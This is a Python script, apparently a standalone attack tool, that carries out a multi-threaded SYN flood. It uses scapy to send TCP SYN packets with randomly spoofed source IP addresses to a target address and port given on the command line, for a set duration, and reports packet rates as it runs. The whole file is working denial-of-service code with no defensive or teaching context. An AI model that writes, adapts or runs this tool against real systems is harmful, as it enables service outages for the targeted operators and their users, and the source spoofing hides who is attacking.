#!/usr/bin/env python3

"""
Advanced SYN Flood Attack Module
Multi-threaded SYN flooder using scapy
"""

import sys
import time
import random
import threading
import argparse
from scapy.all import *

class SynFlooder:
    def __init__(self, target, port, duration, threads=100):
        self.target = target
        self.port = port
        self.duration = duration
        self.threads = threads
        self.stop_event = threading.Event()
        self.packets_sent = 0
        self.lock = threading.Lock()
    
    def random_ip(self):
        """Generate random IP address for spoofing"""
        return ".".join(str(random.randint(1, 254)) for _ in range(4))
    
    def send_syn_packets(self, thread_id):
        """Send SYN packets continuously"""
        print(f"[Thread {thread_id}] Starting SYN flood...")
        
        while not self.stop_event.is_set():
            try:
                # Create SYN packet with random source IP
                src_ip = self.random_ip()
                src_port = random.randint(1024, 65535)
                
                packet = IP(src=src_ip, dst=self.target) / \
                        TCP(sport=src_port, dport=self.port, flags="S", 
                           seq=random.randint(0, 4294967295))
                
                # Send packet
                send(packet, verbose=0)
                
                with self.lock:
                    self.packets_sent += 1
                
                # Small delay to prevent overwhelming
                time.sleep(0.001)
                
            except Exception as e:
                print(f"[Thread {thread_id}] Error: {e}")
                break
    
    def monitor_progress(self):
        """Monitor and display progress"""
        start_time = time.time()
        
        while not self.stop_event.is_set():
            elapsed = time.time() - start_time
            remaining = max(0, self.duration - elapsed)
            
            with self.lock:
                rate = self.packets_sent / max(elapsed, 1)
            
            print(f"\r[SYN FLOOD] Packets: {self.packets_sent} | "
                  f"Rate: {rate:.1f}/s | Remaining: {remaining:.1f}s", 
                  end="", flush=True)
            
            time.sleep(1)
    
    def start_attack(self):
        """Start the SYN flood attack"""
        print(f"\n[PYTHON SYN FLOOD] Starting attack...")
        print(f"Target: {self.target}:{self.port}")
        print(f"Duration: {self.duration} seconds")
        print(f"Threads: {self.threads}")
        print(f"Using spoofed source IPs\n")
        
        # Start threads
        threads = []
        
        # Monitor thread
        monitor_thread = threading.Thread(target=self.monitor_progress)
        monitor_thread.daemon = True
        monitor_thread.start()
        
        # Attack threads
        for i in range(self.threads):
            thread = threading.Thread(target=self.send_syn_packets, args=(i,))
            thread.daemon = True
            threads.append(thread)
            thread.start()
        
        # Run for specified duration
        time.sleep(self.duration)
        
        # Stop all threads
        self.stop_event.set()
        
        # Wait for threads to finish
        for thread in threads:
            thread.join(timeout=1)
        
        print(f"\n\n[ATTACK COMPLETED] Total packets sent: {self.packets_sent}")

def main():
    parser = argparse.ArgumentParser(description="Advanced SYN Flood Attack")
    parser.add_argument("-t", "--target", required=True, help="Target IP address")
    parser.add_argument("-p", "--port", type=int, default=80, help="Target port")
    parser.add_argument("-d", "--duration", type=int, default=60, help="Attack duration")
    parser.add_argument("-r", "--threads", type=int, default=100, help="Number of threads")
    
    args = parser.parse_args()
    
    try:
        flooder = SynFlooder(args.target, args.port, args.duration, args.threads)
        flooder.start_attack()
    except KeyboardInterrupt:
        print("\n\nAttack interrupted by user")
    except Exception as e:
        print(f"\nError: {e}")

if __name__ == "__main__":
    main()

